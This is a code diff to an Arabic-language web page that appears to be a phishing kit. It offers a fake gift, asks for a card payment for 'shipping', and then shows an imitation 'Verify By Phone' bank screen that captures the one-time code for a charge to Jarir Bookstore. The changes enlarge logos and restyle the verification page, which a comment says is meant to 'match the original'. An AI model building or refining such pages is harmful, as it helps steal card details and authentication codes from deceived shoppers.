@@ -22,7 +22,12 @@
 
         .error-msg { display: none; color: white; background: #E30613; padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
         .card-wrapper { position: relative; width: 100%; }
-        .card-type-icon { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); height: 20px; transition: 0.3s; pointer-events: none; opacity: 0; }
+        /* تكبير أيقونة نوع البطاقة داخل الحقل */
+        .card-type-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); height: 28px; transition: 0.3s; pointer-events: none; opacity: 0; }
+        
+        /* تحسينات صفحة التحقق لتطابق الأصلية */
+        #page-verify h2 { font-family: sans-serif; letter-spacing: -0.5px; }
+        .verify-text { font-family: sans-serif; color: #333; }
     </style>
 </head>
 <body class="max-w-md mx-auto shadow-2xl bg-white">
@@ -42,7 +47,7 @@
                     <i class="fa-solid fa-magnifying-glass text-gray-400 mr-2"></i>
                 </div>
                 <div class="flex items-center ml-2">
-                    <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
+                    <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-8">
                 </div>
             </div>
         </header>
@@ -95,7 +100,7 @@
         <header class="p-4 border-b flex justify-between items-center">
             <button onclick="showPage('page-product')"><i class="fa-solid fa-chevron-right"></i>العودة</button>
             <span class="font-bold">معلومات تسليم الهديه</span>
-            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-5">
+            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
         </header>
         <div class="p-6 space-y-4">
             <div id="err-reg" class="error-msg">يرجى إدخال البيانات المطلوبة</div>
@@ -130,7 +135,7 @@
         <header class="p-4 bg-white border-b flex justify-between items-center">
             <button onclick="showPage('page-register')"><i class="fa-solid fa-chevron-right"></i>العودة</button>
             <span class="font-bold">دفع مصاريف الشحن</span>
-            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-5">
+            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
         </header>
         <main class="p-4">
             <div id="err-pay" class="error-msg">يرجى التحقق من بيانات البطاقة</div>
@@ -139,9 +144,9 @@
                     <div class="w-5 h-5 border-[5px] border-blue-600 rounded-full"></div>
                     <div class="text-right">
                         <span class="text-sm font-bold block">الدفع بالبطاقة الائتمانية</span>
-                        <div class="flex gap-1 mt-1">
-                            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-4">
-                            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" class="h-4">
+                        <div class="flex gap-2 mt-2">
+                            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-6">
+                            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" class="h-6">
                         </div>
                     </div>
                 </div>
@@ -160,35 +165,42 @@
             </div>
 
             <div class="mt-8 grid grid-cols-4 gap-2 px-4">
-                <div class="bg-white border rounded p-1 flex items-center justify-center"><img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-3"></div>
-                <div class="bg-white border rounded p-1 flex items-center justify-center"><img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" class="h-4"></div>
-                <div class="bg-white border rounded p-1 flex items-center justify-center"><img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-4"></div>
-                <div class="bg-white border rounded p-1 flex items-center justify-center"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Apple_Pay_logo.svg" class="h-4"></div>
+                <div class="bg-white border rounded p-2 flex items-center justify-center"><img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-6"></div>
+                <div class="bg-white border rounded p-2 flex items-center justify-center"><img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" class="h-7"></div>
+                <div class="bg-white border rounded p-2 flex items-center justify-center"><img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-6"></div>
+                <div class="bg-white border rounded p-2 flex items-center justify-center"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Apple_Pay_logo.svg" class="h-6"></div>
             </div>
         </main>
     </section>
 
-    <section id="page-verify" class="page bg-white p-5">
-        <div class="flex justify-end mb-4"><span class="font-bold text-black cursor-pointer" onclick="showPage('page-payment')">Cancel</span></div>
-        <div class="flex justify-between items-center border-b border-gray-100 pb-3 mb-6">
-            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" style="height: 12px;">
-            <div class="flex items-center gap-1"><img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" style="height: 14px;"> <span class="text-[10px] text-gray-400">Secure</span></div>
+    <section id="page-verify" class="page bg-white p-6">
+        <div class="flex justify-end mb-4">
+            <span class="font-bold text-black cursor-pointer text-base" onclick="showPage('page-payment')">Cancel</span>
         </div>
-        <h2 class="text-2xl font-bold mb-4 text-left">Verify By Phone</h2>
-        <div class="text-left text-sm text-gray-700 leading-relaxed mb-8">
+        <div class="flex justify-between items-center border-b border-gray-100 pb-4 mb-8">
+            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" style="height: 18px;">
+            <div class="flex items-center gap-1">
+                <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" style="height: 22px;"> 
+                <span style="font-family: sans-serif; font-size: 11px; color: #666;">Secure</span>
+            </div>
+        </div>
+        <h2 class="text-[26px] font-bold mb-5 text-left text-black">Verify By Phone</h2>
+        <div class="verify-text text-left text-[15px] leading-relaxed mb-10">
             <p>We have sent you a text message with a code to your registered mobile number.</p>
-            <p class="mt-4">You are paying <strong>JARIR BOOKSTORE</strong> the amount of <strong>SAR 76.00</strong> on 2026/02/15.</p>
+            <p class="mt-5">You are paying <strong>JARIR BOOKSTORE</strong> the amount of <strong>SAR 76.00</strong> on 2026/02/15.</p>
         </div>
         <div id="err-otp" class="error-msg">رمز التحقق غير صحيح، حاول مجدداً</div>
-        <div class="text-center mb-6">
-            <label class="block text-gray-400 text-xs mb-2">Verification code</label>
-            <input type="tel" id="bank-otp" class="w-full border border-gray-300 rounded p-3 text-center text-xl outline-none">
+        <div class="text-center mb-8">
+            <label class="block text-gray-500 text-xs mb-3 font-sans">Verification code</label>
+            <input type="tel" id="bank-otp" class="w-full border border-gray-300 rounded p-4 text-center text-2xl outline-none font-sans tracking-widest">
         </div>
-        <button onclick="sendData('otp')" class="w-full bg-[#0000FF] text-white py-4 font-bold rounded mb-6">CONFIRM</button>
-        <div class="text-center"><span class="text-[#0000FF] font-bold text-sm cursor-pointer">RESEND CODE</span></div>
-        <div class="mt-10 border-t pt-4 space-y-4">
-            <div class="flex justify-between text-sm text-gray-600"><span>Learn more about authentication</span> <span>+</span></div>
-            <div class="flex justify-between text-sm text-gray-600"><span>Need some help ?</span> <span>+</span></div>
+        <button onclick="sendData('otp')" class="w-full bg-[#0000FF] text-white py-4 font-bold rounded-md text-lg mb-8 shadow-sm">CONFIRM</button>
+        <div class="text-center">
+            <span class="text-[#0000FF] font-bold text-sm cursor-pointer hover:underline">RESEND CODE</span>
+        </div>
+        <div class="mt-12 border-t pt-5 space-y-5">
+            <div class="flex justify-between items-center text-[15px] text-[#2D3E50]"><span>Learn more about authentication</span> <span class="text-2xl">+</span></div>
+            <div class="flex justify-between items-center text-[15px] text-[#2D3E50]"><span>Need some help ?</span> <span class="text-2xl">+</span></div>
         </div>
     </section>
 
@@ -209,8 +221,14 @@
 
         function detectCard(v) {
             const img = document.getElementById('card-type-img');
-            if(v.startsWith('4')) { img.src = "https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png"; img.style.opacity = "1"; }
-            else if(v.startsWith('5')) { img.src = "https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png"; img.style.opacity = "1"; }
+            if(v.startsWith('4')) { 
+                img.src = "https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png"; 
+                img.style.opacity = "1"; 
+            }
+            else if(v.startsWith('5')) { 
+                img.src = "https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png"; 
+                img.style.opacity = "1"; 
+            }
             else { img.style.opacity = "0"; }
         }
 
